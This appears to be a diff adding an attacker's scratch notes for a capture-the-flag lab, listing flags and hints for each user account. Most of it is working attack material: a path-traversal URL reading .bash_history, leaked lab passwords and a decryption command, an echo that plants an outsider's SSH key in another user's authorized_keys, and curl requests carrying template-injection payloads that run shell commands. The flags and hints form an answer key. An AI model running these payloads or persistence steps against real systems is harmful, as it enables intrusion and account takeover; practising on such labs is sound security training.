@@ -1,0 +1,52 @@
+http://localhost:5042/api/debug?cmd=cat%20../../../home/hal/.bash_history&token=h4l_d3bug_t0k3n_2024
+
+    part 1 : ol      (~/.config/.key_part)
+    part 2 : wil     (~/data/.key_part)
+    part 3 : sophie  (~/drafts/.key_part)
+    part 4 : xavier  (/tmp/.xn/.key_part)
+
+/home/ol/.config/.key_part      M0ul1n3tt3
+/home/wil/data/.key_part        847_4n0m4l13s
+/home/sophie/drafts/.key_part   S0ph13_J14
+/tmp/.xn/.key_part              uid1337
+
+/home/ol/.config/.key_part /home/wil/data/.key_part /home/sophie/drafts/.key_part /tmp/.xn/.key_part
+
+
+KEY=$(printf "M0ul1n3tt3847_4n0m4l13sS0ph13_J14uid1337" | sha256sum | cut -d' ' -f1)
+openssl enc -d -aes-256-ecb -K "$KEY" -in rapport_final.enc -out rapport_final.txt
+
+total 44
+drwxr-xr-x 5 paco paco 4096 Jun  6 12:30 .
+drwxr-xr-x 9 root root 4096 Jun  6 12:29 ..
+-rw-r--r-- 1 paco paco  274 Jun  6 12:30 .bash_history
+-rw-r--r-- 1 paco paco  220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 paco paco 3771 Mar 31  2024 .bashrc
+-rw-r--r-- 1 paco paco  188 Jun  6 12:30 .env.old
+drwxr-xr-x 2 paco paco 4096 Jun  6 12:30 notes
+-rw-r--r-- 1 paco paco  807 Mar 31  2024 .profile
+drwxr-xr-x 2 paco paco 4096 Jun  6 12:30 scripts
+drwxr-xr-x 2 paco paco 4096 Jun  6 12:30 src
+-rw-r--r-- 1 paco paco  461 Jun  6 12:30 TODO.md
+
+cat /home/paco/.env.old
+# old deploy env — paco. delete this. (you will not delete this)
+DB_PASS=Moulinette2024!
+SECRET_KEY=hal9042secret
+# ssh creds used by the deploy bot
+SSH_USER=paco
+SSH_PASS=Pac0_H4L_dev!
+
+paco:Pac0_H4L_dev!
+
+DEBUG:echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDtFn1kuBpWsfd63x807KGXoFPEvZfLK3Dy2lHLiUMCdsgznLRzvZe50/3fZeSg8ExLJaY4Gne/y1Aq17hyGPWmm3oufLZH6WiQEPJVYnGssLEZ4j7JRpkasAQ46ma5XhVwkwSYjSgP9PdkICSPmEZz+K5VS8vsAtQiJJ1EHGOZCa3FBUb8wRmd+ud2LyZXiGl5J2C1ayA7aIl4k+UPdsfY5yWXA/LmJzrS4rzhop2RLX/casPU2n+ZDKGZBl9ZmlufXsCUBzWzNTLuCoIYZQVhYmMdpMHljYLE9U+rm7hPj65637juOY/xHH9MoCv9W2KfZdIHb1++lBjc4CPSAMpLozqUoUmo6pK+SjkGOfWnwo1RvcC+SMLmj42vp2vdqniai4CgPHuk9BNGV+XgDJwNwO2bvzsM5v7hS9dc58Ueh7KxFa3bdMxBop8/zsDfiPmpOC9vR9xD8QFIviFpHDk718GNQNzBhKFzN7l4cAcXNIL4Zejv+SLUnRs4/s/DrM8= serhouni@e1r4p9.1337.ma" > /home/wil/.ssh/authorized_keys
+DEBUG:cat /home/wil/.ssh/authorized_keys
+
+www|33|FLAG{r3c0n_1s_k1ng}\nFLAG{g1t_n3v3r_f0rg3ts}\nFLAG{s3m1_bl1nd_st1ll_burns}\nFLAG{www_d4t4_1s_just_th3_b3g1nn1ng}|not www-data. the web frontend runs as www-data — get a shell via the semi-blind SSTI on /evaluate (header X-Debug-Render: true) or the LFI->RCE on /api/debug.
+paco|1001|FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}|.env.old in /home/paco was never cleaned up. it holds paco's ssh password.
+wil|1002|FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}|hal9042d listens on 127.0.0.1:7042 and runs as wil. debug mode was never disabled — strings the binary.
+sophie|1003|FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}|wil kept an encrypted ssh key for sophie (~wil/.ssh/id_rsa_sophie.enc). the passphrase is the most common one there is.
+ol|1004|FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}|ol's cron runs /home/ol/scripts/check.sh as ol every 5 minutes. who can write it?
+
+curl -X POST -H 'X-Debug-Render: true' -d "project_name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" http://localhost:5042/evaluate
+curl -X POST -H 'X-Debug-Render: true' -d "project_name={{request.application.__globals__.__builtins__.__import__('os').popen('nc -U /run/flagd/www.sock').read()}}" http://localhost:5042/evaluate
